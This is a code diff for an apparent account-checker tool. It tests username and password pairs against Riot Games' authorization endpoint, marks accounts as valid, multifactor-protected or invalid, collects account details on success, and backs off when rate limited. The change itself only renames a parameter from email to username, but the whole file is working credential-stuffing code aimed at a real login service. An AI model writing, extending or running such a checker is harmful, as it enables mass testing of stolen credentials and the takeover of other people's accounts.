@@ -2,7 +2,7 @@ import { BaseChecker } from './base';
 import { CheckResult } from '@/types';
 
 export class RiotChecker extends BaseChecker {
-  async check(email: string, password: string): Promise<CheckResult> {
+  async check(username: string, password: string): Promise<CheckResult> {
     try {
       // Riot authentication endpoint
       const authResponse = await this.client.post(
@@ -16,12 +16,12 @@ export class RiotChecker extends BaseChecker {
         }
       );
 
-      // Login attempt
+      // Login attempt with username instead of email
       const loginResponse = await this.client.put(
         'https://auth.riotgames.com/api/v1/authorization',
         {
           type: 'auth',
-          username: email,
+          username: username,
           password: password,
           remember: true,
         }
@@ -31,23 +31,23 @@ export class RiotChecker extends BaseChecker {
         // Get account details
         const capture = await this.getAccountDetails(loginResponse.data);
         
-        return this.createResult(email, password, 'riot', 'valid', capture);
+        return this.createResult(username, password, 'riot', 'valid', capture);
       }
 
       if (loginResponse.data?.type === 'multifactor') {
-        return this.createResult(email, password, 'riot', 'valid', {
+        return this.createResult(username, password, 'riot', 'valid', {
           twoFactorEnabled: true,
         });
       }
 
-      return this.createResult(email, password, 'riot', 'invalid');
+      return this.createResult(username, password, 'riot', 'invalid');
     } catch (error: any) {
       if (error.response?.status === 429) {
         await this.sleep(5000); // Rate limited, wait 5 seconds
       }
       
       return this.createResult(
-        email,
+        username,
         password,
         'riot',
         'error',
